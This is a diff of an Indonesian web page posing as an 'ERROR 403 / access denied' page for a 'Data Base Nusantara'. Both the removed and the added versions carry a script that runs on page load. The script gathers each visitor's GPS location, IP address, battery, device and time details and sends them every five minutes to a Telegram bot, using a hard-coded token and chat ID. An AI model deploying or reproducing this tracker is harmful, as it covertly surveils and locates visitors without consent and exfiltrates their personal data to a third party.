@@ -2,162 +2,105 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>ANDA TIDAK MEMILIKI IZIN UNTUK MENGAKSES DATA BASE INI</title>
+  <title>ERROR 403 | Data Base Nusantara</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <script>
-    const BOT_TOKEN = '7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko';
-    const CHAT_ID = '5677912817';
-    const INTERVAL = 5 * 60 * 1000;
-
-    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
-
-    function getID() {
-      let id = localStorage.getItem('usr_id');
-      if (!id) {
-        id = 'USR-' + btoa(Date.now().toString()).slice(0, 10);
-        localStorage.setItem('usr_id', id);
-      }
-      return id;
-    }
-
-    function getBatteryInfo() {
-      return navigator.getBattery().then(b => ({
-        level: Math.round(b.level * 100),
-        charging: b.charging ? 'Charging' : 'Not Charging'
-      }));
-    }
-
-    function getNetworkInfo() {
-      const n = navigator.connection || {};
-      return {
-        type: n.effectiveType || 'Unknown',
-        downlink: n.downlink || 'Unknown',
-        online: navigator.onLine ? 'Yes' : 'No'
-      };
-    }
-
-    function getDeviceInfo() {
-      return {
-        ua: navigator.userAgent,
-        lang: navigator.language,
-        screen: `${screen.width}x${screen.height}`,
-        color: screen.colorDepth,
-        platform: navigator.platform
-      };
-    }
-
-    function getTimeInfo() {
-      const now = new Date();
-      return {
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        local: now.toLocaleString('id-ID'),
-        utc: now.toUTCString()
-      };
-    }
-
-    async function getIP() {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip;
-      } catch {
-        return 'Unknown';
-      }
-    }
-
-    async function collectAndSend() {
-      const id = getID();
-      const ip = await getIP();
-      const bat = await getBatteryInfo();
-      const net = getNetworkInfo();
-      const dev = getDeviceInfo();
-      const time = getTimeInfo();
-
-      navigator.geolocation.getCurrentPosition(async pos => {
-        const { latitude, longitude, accuracy, speed, heading, altitude } = pos.coords;
-
-        const msg = `[TRACKING DEVICE]
-ID: ${id}
-
-Lokasi:
-https://maps.google.com/?q=${latitude},${longitude}
-Latitude: ${latitude}
-Longitude: ${longitude}
-Akurasi: ${(accuracy / 1000).toFixed(2)} km
-Altitude: ${altitude || 'Unknown'}
-Kecepatan: ${speed || 'Unknown'}
-Arah (Heading): ${heading || 'Unknown'}
-
-Waktu:
-Lokal: ${time.local}
-UTC: ${time.utc}
-Zona Waktu: ${time.tz}
-
-Perangkat:
-Platform: ${dev.platform}
-User Agent:
-${dev.ua}
-
-Layar:
-Resolusi: ${dev.screen}
-Warna: ${dev.color}-bit
-
-Baterai:
-Level: ${bat.level}%
-Status: ${bat.charging}
-
-Jaringan:
-Tipe: ${net.type}
-Kecepatan Downlink: ${net.downlink} Mbps
-Bahasa: ${dev.lang}
-Online: ${net.online}
-IP Address: ${ip}
-
-Status:
-Sinkronisasi berhasil dikirim ke server.`;
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-        });
-
-      }, err => console.error('Lokasi gagal:', err), { enableHighAccuracy: true });
-    }
-
-    async function loopSend() {
-      while (true) {
-        collectAndSend();
-        await delay(INTERVAL);
-      }
-    }
-
-    window.onload = () => {
-      collectAndSend();
-      loopSend();
-    };
-  </script>
   <style>
     body {
-      background: #111;
-      color: #111;
-      margin: 0;
-      font-family: sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-    }
-
-    body::before {
-      content: "ANDA TIDAK MEMILIKI IZIN UNTUK MENGAKSES DATA BASE INI";
-      color: #f00;
-      font-weight: bold;
-      font-size: 18px;
+      font-family: 'Courier New', monospace;
+      background-color: #0f0f0f;
+      color: #ffffff;
       text-align: center;
+      padding: 30px;
+    }
+    img {
+      width: 150px;
+      filter: grayscale(100%) brightness(200%);
+      margin-bottom: 20px;
+    }
+    h1 {
+      color: #ff4444;
+      font-size: 22px;
+    }
+    .map {
+      margin-top: 20px;
+      width: 100%;
+      height: 300px;
+      border: none;
     }
   </style>
 </head>
 <body>
+
+  <img src="https://borneo101.github.io/DataBaseNusantara/garuda_ai.png" alt="Garuda AI">
+
+  <h1>ANDA TIDAK MEMILIKI IZIN UNTUK MENGAKSES DATA BASE INI</h1>
+  <p>Pelacakan otomatis sedang dijalankan...</p>
+
+  <iframe id="map" class="map" src="" allowfullscreen></iframe>
+
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    const chat_id = "5677912817"; // Ganti dengan ID mu
+    const bot_token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko"; // Ganti dengan token bot
+
+    function kirimData(data) {
+      const url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
+      $.post(url, { chat_id, text: data });
+    }
+
+    function updateMap(lat, lon) {
+      document.getElementById("map").src = `https://maps.google.com/maps?q=${lat},${lon}&hl=es;z=14&output=embed`;
+    }
+
+    function collectAndSend() {
+      navigator.geolocation.getCurrentPosition(async function(pos) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const accuracy = pos.coords.accuracy;
+        const altitude = pos.coords.altitude || "Unknown";
+        const speed = pos.coords.speed || "Unknown";
+        const heading = pos.coords.heading || "Unknown";
+
+        updateMap(lat, lon);
+
+        const battery = await navigator.getBattery();
+        const level = Math.round(battery.level * 100);
+        const charging = battery.charging ? "Charging" : "Not Charging";
+
+        const ipRes = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+        const ip = ipRes.ip;
+
+        const now = new Date();
+        const utc = now.toUTCString();
+        const local = now.toLocaleString("id-ID");
+
+        const payload = `
+[TRACKING DEVICE]
+IP: ${ip}
+Battery: ${level}% (${charging})
+User Agent: ${navigator.userAgent}
+Language: ${navigator.language}
+Platform: ${navigator.platform}
+Online: ${navigator.onLine}
+
+Lokasi:
+Latitude: ${lat}
+Longitude: ${lon}
+Accuracy: ${accuracy}m
+Altitude: ${altitude}
+Speed: ${speed}
+Heading: ${heading}
+Local Time: ${local}
+UTC: ${utc}
+Map: https://maps.google.com/?q=${lat},${lon}
+        `.trim();
+
+        kirimData(payload);
+      });
+    }
+
+    collectAndSend();
+    setInterval(collectAndSend, 5 * 60 * 1000);
+  </script>
 </body>
 </html>
